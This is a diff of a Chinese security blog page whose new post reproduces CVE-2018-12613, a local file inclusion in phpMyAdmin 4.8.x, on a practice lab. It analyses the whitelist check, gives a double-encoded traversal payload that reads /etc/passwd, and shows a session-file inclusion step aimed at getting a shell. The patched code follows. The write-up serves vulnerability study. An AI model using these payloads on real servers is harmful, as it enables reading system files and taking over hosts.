@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Href | 九世的博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Href | 九世的博客">
+  <title>CVE-2018-12613phpmyadmin本地文件包含复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="CVE-2018-12613phpmyadmin本地文件包含复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1441,19 +1441,25 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2018-12613phpmyadmin本地文件包含复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Href</h1>
+        <h1 class="article-title">CVE-2018-12613phpmyadmin本地文件包含复现</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color5">漏洞复现</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-07-14 15:45:36">2019-06-15 23:02</time>
+        创建时间:<time class="date" title="更新时间: 2020-07-21 20:46:44">2020-07-21 20:26</time>
         
     </div>
     <div class="article-meta">
@@ -1475,7 +1481,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#友链"><span class="toc-text">友链</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码刨析"><span class="toc-text">代码刨析</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1490,14 +1496,137 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><p>BGM:拔剑神曲</p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe>
+        <p>最近看到某文章提到了，最近在学代码审计顺便看看<br>漏洞影响</p>
+<ul>
+<li>4.8.0</li>
+<li>4.8.0.1</li>
+<li>4.8.1</li>
+</ul>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpmyadmin 4.8.1<br>这里直接用的靶场<a href="https://store.vsplate.com/" target="_blank" rel="noopener">https://store.vsplate.com/</a></p>
+<h2 id="代码刨析"><a href="#代码刨析" class="headerlink" title="代码刨析"></a>代码刨析</h2><p>问题出现在index.php第61行<br>(index.php 55行~63行)</p>
+<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
+    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
+    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
+    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
+    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
+) {
+    include $_REQUEST[&#39;target&#39;]; //问题出现在这
+    exit;
+}
+</code></pre>
+<p>这段代码的内容为：</p>
+<ul>
+<li>$_REQUEST[‘target’]参数为字符串类型</li>
+<li>$_REQUEST[‘target’]参数不存在index关键字</li>
+<li>$_REQUEST[‘target’]参数不存在黑名单$target_blacklist</li>
+<li>checkPageValidity函数返回True</li>
+</ul>
+<p>checkPageValidity函数代码<br>(Core.php 443~476行)</p>
+<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
+{
+    if (empty($whitelist)) {
+        $whitelist = self::$goto_whitelist; //白名单
+    }
+    if (! isset($page) || !is_string($page)) { //$page参数不存在，不是string类型
+        return false;
+    }
 
-<p><a href="http://www.secist.com/" target="_blank" rel="noopener">即刻安全</a><br><img src="https://s2.ax1x.com/2019/06/15/VoIuzd.md.png" alt=""></p>
-<p><a href="https://www.hackingarticles.in/" target="_blank" rel="noopener">Hacking</a><br><img src="https://s2.ax1x.com/2019/06/15/VoIxmt.md.png" alt=""></p>
-<p><a href="https://orochi4268.github.io/" target="_blank" rel="noopener">木头的博客</a><br><img src="https://s2.ax1x.com/2019/06/15/Voo9k8.md.png" alt=""></p>
-<p><a href="hackhat.net">hackhat社区</a><br><img src="https://s2.ax1x.com/2019/06/15/Vo7WlQ.md.png" alt=""></p>
-<p><a href="https://www.cnblogs.com/x-hong/" target="_blank" rel="noopener">Xhong的博客</a><br><img src="https://s2.ax1x.com/2019/12/12/QyK8Ug.md.png" alt=""></p>
+
+    if (in_array($page, $whitelist)) { //$page参数在白名单里 （无法利用，没对$page参数做任何取值判断）
+        return true;
+    }
+
+
+    $_page = mb_substr(
+        $page,
+        0,
+        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+    ); //取第一个字符到?号前一个位置的内容
+    if (in_array($_page, $whitelist)) { //$page里面的参数是否在白名单内 （无法利用，$page参数带?就会被php认为php里的参数）
+        return true;
+    }
+
+
+    $_page = urldecode($page); //url解码
+    $_page = mb_substr(
+        $_page,
+        0,
+        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+    ); //取第一个字符到?号前一个位置的内容
+    if (in_array($_page, $whitelist)) { //url解码后判断$page里面的参数是否在白名单内 （可以利用，因为url编码绕过了上面所描述的问题）
+        return true;
+    }
+
+
+    return false;
+}
+</code></pre>
+<p>白名单</p>
+<pre><code class="php">public static $goto_whitelist = array(
+    &#39;db_datadict.php&#39;,
+    &#39;db_sql.php&#39;,
+    &#39;db_events.php&#39;,
+    &#39;db_export.php&#39;,
+    &#39;db_importdocsql.php&#39;,
+    &#39;db_multi_table_query.php&#39;,
+    &#39;db_structure.php&#39;,
+    &#39;db_import.php&#39;,
+    &#39;db_operations.php&#39;,
+    &#39;db_search.php&#39;,
+    &#39;db_routines.php&#39;,
+    &#39;export.php&#39;,
+    &#39;import.php&#39;,
+    &#39;index.php&#39;,
+    &#39;pdf_pages.php&#39;,
+    &#39;pdf_schema.php&#39;,
+    &#39;server_binlog.php&#39;,
+    &#39;server_collations.php&#39;,
+    &#39;server_databases.php&#39;,
+    &#39;server_engines.php&#39;,
+    &#39;server_export.php&#39;,
+    &#39;server_import.php&#39;,
+    &#39;server_privileges.php&#39;,
+    &#39;server_sql.php&#39;,
+    &#39;server_status.php&#39;,
+    &#39;server_status_advisor.php&#39;,
+    &#39;server_status_monitor.php&#39;,
+    &#39;server_status_queries.php&#39;,
+    &#39;server_status_variables.php&#39;,
+    &#39;server_variables.php&#39;,
+    &#39;sql.php&#39;,
+    &#39;tbl_addfield.php&#39;,
+    &#39;tbl_change.php&#39;,
+    &#39;tbl_create.php&#39;,
+    &#39;tbl_import.php&#39;,
+    &#39;tbl_indexes.php&#39;,
+    &#39;tbl_sql.php&#39;,
+    &#39;tbl_export.php&#39;,
+    &#39;tbl_operations.php&#39;,
+    &#39;tbl_structure.php&#39;,
+    &#39;tbl_relation.php&#39;,
+    &#39;tbl_replace.php&#39;,
+    &#39;tbl_row_action.php&#39;,
+    &#39;tbl_select.php&#39;,
+    &#39;tbl_zoom_select.php&#39;,
+    &#39;transformation_overview.php&#39;,
+    &#39;transformation_wrapper.php&#39;,
+    &#39;user_password.php&#39;,
+);
+</code></pre>
+<p>利用的payload</p>
+<pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd当解析到/../../../../../../../../etc/passwd会进行包含，实现利用
+</code></pre><p>验证是否存在包含</p>
+<pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojReJ.png" alt=""></p>
+<p>利用session文件getshell （方法有很多）<br>（在cookie找到phpmyadmin参数）</p>
+<pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_01876fad4b7e3596a65aa96048b99def #有些是/tmp路径有些是别的路径被这个坑的老惨了
+</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojIW6.png" alt=""></p>
+<p>新版phpmyadmin修复代码</p>
+<pre><code class="php">if (isset($GLOBALS[&#39;target&#39;]) &amp;&amp; is_string($GLOBALS[&#39;target&#39;]) &amp;&amp; !empty($GLOBALS[&#39;target&#39;]) &amp;&amp; in_array($GLOBALS[&#39;target&#39;], $goto_whitelist)) {
+    $main_target = $GLOBALS[&#39;target&#39;];
+}
+</code></pre>
+<p>参考链接：<a href="https://blog.csdn.net/qq_34444097/article/details/85264686" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/85264686</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1505,6 +1634,18 @@
 </article>
 
 
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>CVE-2018-12613phpmyadmin本地文件包含复现</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-07-21, 20:26:18</p>
+    <p><span class="copy-title">最后更新:</span>2020-07-21, 20:46:44</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/299f8a4a.html" title="CVE-2018-12613phpmyadmin本地文件包含复现">http://422926799.github.io/posts/299f8a4a.html</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
 
 
 
